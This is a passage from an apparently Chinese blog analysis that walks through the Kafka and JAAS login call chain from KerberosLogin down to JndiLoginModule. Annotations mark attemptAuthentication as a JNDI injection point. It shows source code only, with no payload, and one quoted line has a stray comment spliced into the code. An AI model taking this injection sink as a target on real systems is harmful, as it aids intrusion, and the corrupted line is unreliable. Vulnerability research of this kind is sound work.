class="hljs-built_in">this</span>.loginCallbackHandler);<br>    <span class="hljs-comment">//调用至login()</span><br>    <span class="hljs-built_in">this</span>.login.login();<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.kerberos.KerberosLogin#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-14.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> LoginContext <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-built_in">this</span>.lastLogin = <span class="hljs-built_in">this</span>.currentElapsedTime();<br><span class="hljs-comment">//调用其父类AbstractLogin#login()</span><br>    <span class="hljs-built_in">this</span>.loginContext = <span class="hljs-built_in">super</span>.login();<br>    <span class="hljs-built_in">this</span>.subject = <span class="hljs-built_in">this</span>.loginContext.getSubject();<br>    <span class="hljs-built_in">this</span>.isKrbTicket = !<span class="hljs-built_in">this</span>.subject.getPrivateCredentials(KerberosTicket.class).isEmpty();<br>    AppConfigurationEntry[] entries = <span class="hljs-built_in">this</span>.configuration().getAppConfigurationEntry(<span class="hljs-built_in">this</span>.contextName());<br>    <span class="hljs-keyword">if</span> (entries.length == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">this</span>.isUsingTicketCache = <span class="hljs-literal">false</span>;<br>        <span class="hljs-built_in">this</span>.principal = <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ...<br>    &#125;<br>...<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.authenticator.AbstractLogin#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-15.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> LoginContext <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-comment">//声明LoginContext</span><br>    <span class="hljs-built_in">this</span>.loginContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginContext</span>(<span class="hljs-built_in">this</span>.contextName, (Subject)<span class="hljs-literal">null</span>, <span class="hljs-built_in">this</span>.loginCallbackHandler, <span class="hljs-built_in">this</span>.configuration);<br>    <span class="hljs-comment">//调用LoginContext#login()</span><br><span class="hljs-built_in">this</span>.loginContext.login();<br>    log.info(<span class="hljs-string">&quot;Successfully logged in.&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.loginContext;<br>&#125;<br></code></pre></td></tr></table></figure><p>javax.security.auth.login.LoginContext#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-16.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br><br>    loginSucceeded = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (subject == <span class="hljs-literal">null</span>) &#123;<br>        subject = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// module invoked in doPrivileged</span><br>        <span class="hljs-comment">//LOGIN_METHOD为为login</span><br>        invokePriv(LOGIN_METHOD);<br>        invokePriv(COMMIT_METHOD);<br>        loginSucceeded = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            invokePriv(ABORT_METHOD);<br>        &#125; <span class="hljs-keyword">catch</span> (LoginException le2) &#123;<br>            <span class="hljs-keyword">throw</span> le;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> le;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>javax.security.auth.login.LoginContext#invokePriv()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-17.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokePriv</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String methodName)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        java.security.AccessController.doPrivileged<br>            (<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;<br>            <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>                invoke(methodName);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;, creatorAcc);<br>    &#125; <span class="hljs-keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;<br>        <span class="hljs-keyword">throw</span> (LoginException)pae.getException();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>javax.security.auth.login.LoginContext#invoke()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-18.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(String methodName)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br><br>    <span class="hljs-comment">// start at moduleIndex</span><br>    <span class="hljs-comment">// - this can only be non-zero if methodName is LOGIN_METHOD</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">mIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            Method[] methods = <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (moduleStack[i].<span class="hljs-keyword">module</span> != <span class="hljs-literal">null</span>) &#123;<br>                methods = moduleStack[i].<span class="hljs-keyword">module</span>.getClass().getMethods();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                <span class="hljs-comment">// instantiate the LoginModule</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// Allow any object to be a LoginModule as long as it</span><br>                <span class="hljs-comment">// conforms to the interface.</span><br>                Class&lt;?&gt; c = Class.forName(<br>                            moduleStack[i].entry.getLoginModuleName(),<br>                            <span class="hljs-literal">true</span>,<br>                            contextClassLoader);<br><br>                Constructor&lt;?&gt; constructor = c.getConstructor(PARAMS);<br>                Object[] args = &#123; &#125;;<br>                moduleStack[i].<span class="hljs-keyword">module</span> = constructor.newInstance(args);<br><br>                <span class="hljs-comment">// call the LoginModule&#x27;s initialize method</span><br>                methods = moduleStack[i].<span class="hljs-keyword">module</span>.getClass().getMethods();<br>                <span class="hljs-keyword">for</span> (mIndex = <span class="hljs-number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;<br>                    <span class="hljs-keyword">if</span> (methods[mIndex].getName().equals(INIT_METHOD)) &#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                Object[] initArgs = &#123;subject,<br>                                    callbackHandler,<br>                                    state,<br>                                    moduleStack[i].entry.getOptions() &#125;;<br>                <span class="hljs-comment">// invoke the LoginModule initialize method</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// Throws ArrayIndexOutOfBoundsException if no such</span><br>                <span class="hljs-comment">// method defined.  May improve to use LoginException in</span><br>                <span class="hljs-comment">// the future.</span><br>                <span class="hljs-comment">//invoke调用</span><br>                methods[mIndex].invoke(moduleStack[i].<span class="hljs-keyword">module</span>, initArgs);<br>            &#125;<br><br>            <span class="hljs-comment">// find the requested method in the LoginModule</span><br>            <span class="hljs-keyword">for</span> (mIndex = <span class="hljs-number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;<br>                <span class="hljs-keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// set up the arguments to be passed to the LoginModule method</span><br>            Object[] args = &#123; &#125;;<br><br>            <span class="hljs-comment">// invoke the LoginModule method</span><br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// Throws ArrayIndexOutOfBoundsException if no such</span><br>            <span class="hljs-comment">// method defined.  May improve to use LoginException in</span><br>            <span class="hljs-comment">// the future.</span><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> ((Boolean)methods[mIndex].invoke<br>                            (moduleStack[i].<span class="hljs-keyword">module</span>, args)).booleanValue();<br><br>            <span class="hljs-keyword">if</span> (status == <span class="hljs-literal">true</span>) &#123;<br><br>                <span class="hljs-comment">// if SUFFICIENT, return if no prior REQUIRED errors</span><br>                <span class="hljs-keyword">if</span> (!methodName.equals(ABORT_METHOD) &amp;&amp;<br>                    !methodName.equals(LOGOUT_METHOD) &amp;&amp;<br>                    moduleStack[i].entry.getControlFlag() ==<br>                AppConfigurationEntry.LoginModuleControlFlag.SUFFICIENT &amp;&amp;<br>                    firstRequiredError == <span class="hljs-literal">null</span>) &#123;<br><br>                    <span class="hljs-comment">// clear state</span><br>                    clearState();<br><br>                    <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                        debug.println(methodName + <span class="hljs-string">&quot; SUFFICIENT success&quot;</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; success&quot;</span>);<br>                success = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; ignored&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException nsme) &#123;<br>            <span class="hljs-type">MessageFormat</span> <span class="hljs-variable">form</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageFormat</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.instantiate.LoginModule.module.because.it.does.not.provide.a.no.argument.constructor&quot;</span>));<br>            Object[] source = &#123;moduleStack[i].entry.getLoginModuleName()&#125;;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(form.format(source)));<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException ie) &#123;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.instantiate.LoginModule.&quot;</span>) +<br>                    ie.getMessage()));<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.find.LoginModule.class.&quot;</span>) +<br>                    cnfe.getMessage()));<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException iae) &#123;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.access.LoginModule.&quot;</span>) +<br>                    iae.getMessage()));<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ite) &#123;<br><br>            <span class="hljs-comment">// failure cases</span><br><br>            LoginException le;<br><br>            <span class="hljs-keyword">if</span> (ite.getCause() <span class="hljs-keyword">instanceof</span> PendingException &amp;&amp;<br>                methodName.equals(LOGIN_METHOD)) &#123;<br><br>                <span class="hljs-comment">// XXX</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// if a module&#x27;s LOGIN_METHOD threw a PendingException</span><br>                <span class="hljs-comment">// then immediately throw it.</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// when LoginContext is called again,</span><br>                <span class="hljs-comment">// the module that threw the exception is invoked first</span><br>                <span class="hljs-comment">// (the module list is not invoked from the start).</span><br>                <span class="hljs-comment">// previously thrown exception state is still present.</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// it is assumed that the module which threw</span><br>                <span class="hljs-comment">// the exception can have its</span><br>                <span class="hljs-comment">// LOGIN_METHOD invoked twice in a row</span><br>                <span class="hljs-comment">// without any commit/abort in between.</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// in all cases when LoginContext returns</span><br>                <span class="hljs-comment">// (either via natural return or by throwing an exception)</span><br>                <span class="hljs-comment">// we need to call clearState before returning.</span><br>                <span class="hljs-comment">// the only time that is not true is in this case -</span><br>                <span class="hljs-comment">// do not call throwException here.</span><br><br>                <span class="hljs-keyword">throw</span> (PendingException)ite.getCause();<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ite.getCause() <span class="hljs-keyword">instanceof</span> LoginException) &#123;<br><br>                le = (LoginException)ite.getCause();<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ite.getCause() <span class="hljs-keyword">instanceof</span> SecurityException) &#123;<br><br>                <span class="hljs-comment">// do not want privacy leak</span><br>                <span class="hljs-comment">// (e.g., sensitive file path in exception msg)</span><br><br>                le = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(<span class="hljs-string">&quot;Security Exception&quot;</span>);<br>                le.initCause(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>());<br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>) &#123;<br>                    debug.println<br>                        (<span class="hljs-string">&quot;original security exception with detail msg &quot;</span> +<br>                        <span class="hljs-string">&quot;replaced by new exception with empty detail msg&quot;</span>);<br>                    debug.println(<span class="hljs-string">&quot;original security exception: &quot;</span> +<br>                            ite.getCause().toString());<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                <span class="hljs-comment">// capture an unexpected LoginModule exception</span><br>                java.io.<span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StringWriter();<br>                ite.getCause().printStackTrace<br>                                            (<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.PrintWriter(sw));<br>                sw.flush();<br>                le = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(sw.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (moduleStack[i].entry.getControlFlag() ==<br>                AppConfigurationEntry.LoginModuleControlFlag.REQUISITE) &#123;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; REQUISITE failure&quot;</span>);<br><br>                <span class="hljs-comment">// if REQUISITE, then immediately throw an exception</span><br>                <span class="hljs-keyword">if</span> (methodName.equals(ABORT_METHOD) ||<br>                    methodName.equals(LOGOUT_METHOD)) &#123;<br>                    <span class="hljs-keyword">if</span> (firstRequiredError == <span class="hljs-literal">null</span>)<br>                        firstRequiredError = le;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    throwException(firstRequiredError, le);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (moduleStack[i].entry.getControlFlag() ==<br>                AppConfigurationEntry.LoginModuleControlFlag.REQUIRED) &#123;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; REQUIRED failure&quot;</span>);<br><br>                <span class="hljs-comment">// mark down that a REQUIRED module failed</span><br>                <span class="hljs-keyword">if</span> (firstRequiredError == <span class="hljs-literal">null</span>)<br>                    firstRequiredError = le;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; OPTIONAL failure&quot;</span>);<br><br>                <span class="hljs-comment">// mark down that an OPTIONAL module failed</span><br>                <span class="hljs-keyword">if</span> (firstError == <span class="hljs-literal">null</span>)<br>                    firstError = le;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// we went thru all the LoginModules.</span><br>    <span class="hljs-keyword">if</span> (firstRequiredError != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// a REQUIRED module failed -- return the error</span><br>        throwException(firstRequiredError, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (success == <span class="hljs-literal">false</span> &amp;&amp; firstError != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// no module succeeded -- return the first error</span><br>        throwException(firstError, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (success == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-comment">// no module succeeded -- all modules were IGNORED</span><br>        throwException(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span><br>            (ResourcesMgr.getString(<span class="hljs-string">&quot;Login.Failure.all.modules.ignored&quot;</span>)),<br>            <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// success</span><br><br>        clearState();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.sun.security.auth.module#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-19.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br><span class="hljs-comment">//userProvider不能为空</span><br>    <span class="hljs-keyword">if</span> (userProvider不能为空 == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span><br>            (<span class="hljs-string">&quot;Error: Unable to locate JNDI user provider&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//groupProvider不能为空</span><br>    <span class="hljs-keyword">if</span> (groupProvider == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span><br>            (<span class="hljs-string">&quot;Error: Unable to locate JNDI group provider&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (debug) &#123;<br>        System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] user provider: &quot;</span> +<br>                            userProvider);<br>        System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] group provider: &quot;</span> +<br>                            groupProvider);<br>    &#125;<br><br>    <span class="hljs-comment">// attempt the authentication</span><br><span class="hljs-comment">//tryFirstPass为true进入</span><br>    <span class="hljs-keyword">if</span> (tryFirstPass) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// attempt the authentication by getting the</span><br>            <span class="hljs-comment">// username and password from shared state</span><br>            <span class="hljs-comment">//存在JNDI注入</span><br>            attemptAuthentication(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// authentication succeeded</span><br>            succeeded = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;tryFirstPass succeeded&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>            <span class="hljs-comment">// authentication failed -- try again below by prompting</span><br>            cleanState();<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;tryFirstPass failed with:&quot;</span> +<br>                            le.toString());<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//useFirstPass为true</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (useFirstPass) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// attempt the authentication by getting the</span><br>            <span class="hljs-comment">// username and password from shared state</span><br>            <span class="hljs-comment">//存在JNDI注入</span><br>            attemptAuthentication(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// authentication succeeded</span><br>            succeeded = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;useFirstPass 